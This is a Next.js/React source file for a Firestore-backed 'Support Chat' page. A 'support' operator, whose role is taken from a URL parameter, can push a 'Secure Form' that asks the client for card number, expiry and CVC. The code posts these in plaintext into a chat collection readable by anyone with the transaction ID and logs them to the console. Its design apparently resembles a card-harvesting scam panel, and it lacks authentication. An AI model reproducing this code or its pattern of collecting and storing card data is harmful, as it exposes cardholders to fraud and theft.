"use client";

import React, {
  Suspense,
  useState,
  useEffect,
  ChangeEvent,
  FormEvent,
  useRef,
} from "react";
import Image from "next/image";
import { useSearchParams } from "next/navigation";
import {
  collection,
  query,
  where,
  orderBy,
  onSnapshot,
  addDoc,
  updateDoc,
  deleteDoc,
  serverTimestamp,
  Timestamp,
  QuerySnapshot,
  CollectionReference,
  doc,
  getDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";

// ---------------------------
// Data Types
// ---------------------------
type Message = {
  id?: string;
  sender: string; // "support" | "client"
  text: string;
  // Use messageType to distinguish normal text, secure form request, or secure form response.
  messageType?: "text" | "secure_form_request" | "secure_form_response";
  timestamp?: Timestamp;
  transactionId: string;
};

type UserData = {
  userID: string;
  username: string;
};

type PreComposedMessage = {
  id: string;
  text: string;
};

interface TransactionFormProps {
  onSubmit: (tx: string) => void;
}

// ---------------------------
// TransactionForm Component
// ---------------------------
function TransactionForm({ onSubmit }: TransactionFormProps) {
  const [input, setInput] = useState("");

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    const trimmed = input.trim();
    if (trimmed) {
      onSubmit(trimmed);
    }
  };

  return (
    <form onSubmit={handleSubmit} style={{ textAlign: "center", marginTop: "50px" }}>
      <h2 style={{ color: "black" }}>Please enter a valid transaction ID:</h2>
      <input
        type="text"
        value={input}
        onChange={(e: ChangeEvent<HTMLInputElement>) => setInput(e.target.value)}
        placeholder="Enter Transaction ID"
        style={{ padding: "10px", fontSize: "16px", color: "black" }}
      />
      <button type="submit" style={{ padding: "10px 20px", marginLeft: "10px" }}>
        Submit
      </button>
    </form>
  );
}

// ---------------------------
// SecureForm Component (for card credentials)
// ---------------------------
interface SecureFormProps {
  onSubmit: (data: { cardHolder: string; cardNumber: string; expiry: string; cvc: string }) => void;
  onCancel: () => void;
}
function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
  const [formData, setFormData] = useState({
    cardHolder: "",
    cardNumber: "",
    expiry: "",
    cvc: "",
  });

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <form onSubmit={handleSubmit} style={secureFormStyle}>
      <h4 style={{ marginBottom: "10px", color: "black" }}>Secure Form</h4>
      <input
        type="text"
        name="cardHolder"
        placeholder="Card Holder Name"
        value={formData.cardHolder}
        onChange={handleChange}
        style={{ ...secureInputStyle, color: "black" }}
      />
      <input
        type="text"
        name="cardNumber"
        placeholder="Card Number"
        value={formData.cardNumber}
        onChange={handleChange}
        style={{ ...secureInputStyle, color: "black" }}
      />
      <input
        type="text"
        name="expiry"
        placeholder="Expiry (MM/YY)"
        value={formData.expiry}
        onChange={handleChange}
        style={{ ...secureInputStyle, color: "black" }}
      />
      <input
        type="text"
        name="cvc"
        placeholder="CVC"
        value={formData.cvc}
        onChange={handleChange}
        style={{ ...secureInputStyle, color: "black" }}
      />
      <div style={{ marginTop: "10px" }}>
        <button type="submit" style={secureButtonStyle}>
          Submit
        </button>
        <button type="button" onClick={onCancel} style={{ ...secureButtonStyle, marginLeft: "10px" }}>
          Cancel
        </button>
      </div>
    </form>
  );
}

// ---------------------------
// ChatContent Component
// ---------------------------
function ChatContent() {
  const searchParams = useSearchParams();
  const initialTx = searchParams.get("tx") || "";
  // In this demo, we use the role from the URL. For testing, open two tabs:
  // One with ?role=support and one with ?role=client.
  const role = searchParams.get("role") || "support";

  // Main state for chat
  const [transactionId, setTransactionId] = useState(initialTx);
  const [messages, setMessages] = useState<Message[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [user, setUser] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(false);
  const [containerLoaded, setContainerLoaded] = useState(false);
  const [preComposedMessages, setPreComposedMessages] = useState<PreComposedMessage[]>([]);
  const [editingPreComposedId, setEditingPreComposedId] = useState<string | null>(null);
  const [editingPreComposedText, setEditingPreComposedText] = useState("");
  // For client: if a secure form request is received, show the secure form container.
  const [showSecureForm, setShowSecureForm] = useState(false);

  const messagesEndRef = useRef<HTMLDivElement | null>(null);

  // Unconditionally call hooks
  useEffect(() => {
    setContainerLoaded(true);
  }, []);

  useEffect(() => {
    async function fetchUserData() {
      setLoading(true);
      try {
        const userDoc = await getDoc(doc(db, "users", transactionId));
        if (userDoc.exists()) {
          setUser(userDoc.data() as UserData);
        } else {
          setUser(null);
          console.error("User not found in Firestore");
        }
      } catch (error) {
        console.error("Error fetching user data:", error);
      }
      setLoading(false);
    }
    if (transactionId) {
      fetchUserData();
    }
  }, [transactionId]);

  useEffect(() => {
    if (!transactionId) return;
    const messagesRef = collection(db, "messages") as CollectionReference<Message>;
    const q = query(
      messagesRef,
      where("transactionId", "==", transactionId),
      orderBy("timestamp", "asc")
    );
    const unsubscribe = onSnapshot(q, (snapshot: QuerySnapshot<Message>) => {
      const msgs = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      }));
      setMessages(msgs);
    });
    return () => unsubscribe();
  }, [transactionId]);

  useEffect(() => {
    const preCompRef = collection(db, "precomposedMessages");
    const unsubscribe = onSnapshot(preCompRef, (snapshot) => {
      const msgs: PreComposedMessage[] = snapshot.docs.map((doc) => ({
        id: doc.id,
        text: doc.data().text,
      }));
      setPreComposedMessages(msgs);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [messages]);

  // Client side: if a secure form request message exists, render its container.
  useEffect(() => {
    if (role === "client") {
      const hasSecureRequest = messages.some(
        (msg) => msg.messageType === "secure_form_request"
      );
      if (hasSecureRequest) {
        setShowSecureForm(true);
      } else {
        setShowSecureForm(false);
      }
    }
  }, [messages, role]);

  // Define container animation style
  const containerAnimationStyle: React.CSSProperties = {
    opacity: containerLoaded ? 1 : 0,
    transform: containerLoaded ? "translateY(0)" : "translateY(20px)",
    transition: "opacity 0.5s ease-out, transform 0.5s ease-out",
  };

  // Chat functions
  const sendMessage = async (
    text: string,
    messageType: Message["messageType"] = "text"
  ) => {
    const trimmed = text.trim();
    if (!trimmed) return;
    try {
      await addDoc(collection(db, "messages"), {
        transactionId,
        sender: role,
        text: trimmed,
        messageType,
        timestamp: serverTimestamp(),
      });
    } catch (error) {
      console.error("Error sending message:", error);
    }
  };

  const handleSend = async (e: FormEvent) => {
    e.preventDefault();
    await sendMessage(chatInput);
    setChatInput("");
  };

  // For support: send a secure form request message (which will appear on the client)
  const handleSendSecureFormRequest = async () => {
    await sendMessage(
      "Secure form request: Please fill out the secure form below.",
      "secure_form_request"
    );
  };

  // When the client fills out the secure form container
  const handleSecureFormSubmit = async (data: { cardHolder: string; cardNumber: string; expiry: string; cvc: string }) => {
    console.log("Received secure form data:", data);
    // WARNING: Do not send sensitive details as plaintext in production.
    await sendMessage(JSON.stringify(data), "secure_form_response");
    setShowSecureForm(false);
  };

  // In the rendering, if a message has type secure_form_request and the role is client,
  // display the SecureForm container instead of plain text.
  const renderMessageContent = (msg: Message) => {
    if (msg.messageType === "secure_form_request" && role === "client") {
      return (
        <div style={{ padding: "10px", border: "1px solid #ccc", borderRadius: "10px", backgroundColor: "#fff" }}>
          <SecureForm onSubmit={handleSecureFormSubmit} onCancel={() => setShowSecureForm(false)} />
        </div>
      );
    }
    if (msg.text.startsWith("data:image/")) {
      return (
        <Image
          src={msg.text}
          alt="Uploaded"
          width={300}
          height={200}
          style={{ borderRadius: "10px", marginTop: "5px" }}
        />
      );
    }
    return <span>{msg.text}</span>;
  };

  return (
    <div style={chatPageStyle}>
      {(!transactionId || transactionId === "support-chat") ? (
        <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />
      ) : loading ? (
        <h2 style={{ textAlign: "center", marginTop: "50px", color: "black" }}>
          Loading...
        </h2>
      ) : (
        <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
          {/* Chat Container */}
          <div style={chatContainerStyle}>
            <div style={chatHeaderStyle}>
              Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
            </div>

            {/* Chat Messages */}
            <div style={chatMessagesStyle}>
              {messages.map((msg) => (
                <div
                  key={msg.id}
                  style={msg.sender === "support" ? supportMessageStyle : clientMessageStyle}
                >
                  <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
                </div>
              ))}
              <div ref={messagesEndRef} />
            </div>

            {/* Chat Input */}
            <form onSubmit={handleSend} style={chatInputContainerStyle}>
              <input
                type="text"
                value={chatInput}
                onChange={(e: ChangeEvent<HTMLInputElement>) => setChatInput(e.target.value)}
                placeholder="Type your message..."
                style={{ ...chatInputStyle, color: "black" }}
              />
              <button type="submit" style={chatSendStyle}>
                Send
              </button>
              {role === "support" && (
                <button
                  type="button"
                  onClick={handleSendSecureFormRequest}
                  style={{ ...chatSendStyle, marginLeft: "5px", backgroundColor: "#28a745" }}
                >
                  Secure Form
                </button>
              )}
            </form>
          </div>

          {/* Sidebar for Pre-composed Messages */}
          <div style={sidebarStyle}>
            <h3 style={{ color: "black" }}>Pre-composed Messages</h3>
            {preComposedMessages.map((msg) => (
              <div
                key={msg.id}
                style={{
                  marginBottom: "10px",
                  padding: "5px",
                  border: "1px solid #ccc",
                  borderRadius: "5px",
                }}
              >
                <span style={{ color: "black" }}>{msg.text}</span>
                <div style={{ marginTop: "5px" }}>
                  <button onClick={() => sendMessage(msg.text)} style={preComposedButtonStyle}>
                    Send
                  </button>
                  <button
                    onClick={() => {
                      setEditingPreComposedId(msg.id);
                      setEditingPreComposedText(msg.text);
                    }}
                    style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
                  >
                    Edit
                  </button>
                  <button
                    onClick={() => deleteDoc(doc(db, "precomposedMessages", msg.id))}
                    style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
                  >
                    Delete
                  </button>
                </div>
                {editingPreComposedId === msg.id && (
                  <div>
                    <input
                      type="text"
                      value={editingPreComposedText}
                      onChange={(e) => setEditingPreComposedText(e.target.value)}
                      style={{ ...chatInputStyle, marginBottom: "5px", color: "black" }}
                    />
                    <div>
                      <button
                        onClick={() => {
                          const msgRef = doc(db, "precomposedMessages", msg.id);
                          updateDoc(msgRef, { text: editingPreComposedText });
                          setEditingPreComposedId(null);
                          setEditingPreComposedText("");
                        }}
                        style={preComposedButtonStyle}
                      >
                        Save
                      </button>
                      <button
                        onClick={() => {
                          setEditingPreComposedId(null);
                          setEditingPreComposedText("");
                        }}
                        style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// ---------------------------
// SupportChat Component (Wrapper with Suspense)
// ---------------------------
export default function SupportChat() {
  return (
    <Suspense fallback={<div style={{ textAlign: "center", marginTop: "50px", color: "black" }}>Loading chat...</div>}>
      <ChatContent />
    </Suspense>
  );
}

/* ----------------------
   Styling
---------------------- */
const chatPageStyle: React.CSSProperties = {
  margin: 0,
  fontFamily: "sans-serif",
  backgroundColor: "#f1f1f1",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  height: "100vh",
};

const chatWrapperStyle: React.CSSProperties = {
  display: "flex",
  width: "800px",
  height: "600px",
  boxShadow: "0 4px 8px rgba(0,0,0,0.2)",
};

const chatContainerStyle: React.CSSProperties = {
  width: "500px",
  height: "100%",
  backgroundColor: "white",
  display: "flex",
  flexDirection: "column",
  overflow: "hidden",
};

const sidebarStyle: React.CSSProperties = {
  width: "300px",
  padding: "10px",
  backgroundColor: "#f9f9f9",
  borderLeft: "1px solid #ccc",
  display: "flex",
  flexDirection: "column",
};

const chatHeaderStyle: React.CSSProperties = {
  backgroundColor: "#5865f2",
  color: "white",
  padding: "15px",
  textAlign: "center",
  fontSize: "18px",
};

const chatMessagesStyle: React.CSSProperties = {
  flex: 1,
  padding: "10px",
  overflowY: "auto",
  background: "#fafafa",
};

const supportMessageStyle: React.CSSProperties = {
  margin: "10px",
  padding: "10px 15px",
  borderRadius: "15px",
  maxWidth: "70%",
  wordWrap: "break-word",
  fontSize: "15px",
  backgroundColor: "#5865f2",
  color: "white",
  alignSelf: "flex-end",
};

const clientMessageStyle: React.CSSProperties = {
  margin: "10px",
  padding: "10px 15px",
  borderRadius: "15px",
  maxWidth: "70%",
  wordWrap: "break-word",
  fontSize: "15px",
  backgroundColor: "#e0e0e0",
  color: "black",
  alignSelf: "flex-start",
};

const chatInputContainerStyle: React.CSSProperties = {
  display: "flex",
  borderTop: "1px solid #ccc",
  alignItems: "center",
};

const chatInputStyle: React.CSSProperties = {
  flex: 1,
  border: "none",
  padding: "10px",
  fontSize: "16px",
  outline: "none",
  color: "black",
};

const chatSendStyle: React.CSSProperties = {
  border: "none",
  backgroundColor: "#5865f2",
  color: "white",
  padding: "10px 20px",
  cursor: "pointer",
  fontSize: "16px",
};

const preComposedButtonStyle: React.CSSProperties = {
  padding: "5px 10px",
  fontSize: "12px",
  cursor: "pointer",
};

const secureFormStyle: React.CSSProperties = {
  border: "1px solid #ccc",
  padding: "10px",
  margin: "10px",
  borderRadius: "10px",
  backgroundColor: "#fff",
};

const secureInputStyle: React.CSSProperties = {
  width: "100%",
  padding: "8px",
  marginBottom: "5px",
  fontSize: "14px",
  borderRadius: "4px",
  border: "1px solid #ccc",
  color: "black",
};

const secureButtonStyle: React.CSSProperties = {
  padding: "8px 12px",
  fontSize: "14px",
  border: "none",
  borderRadius: "4px",
  cursor: "pointer",
  backgroundColor: "#5865f2",
  color: "white",
};
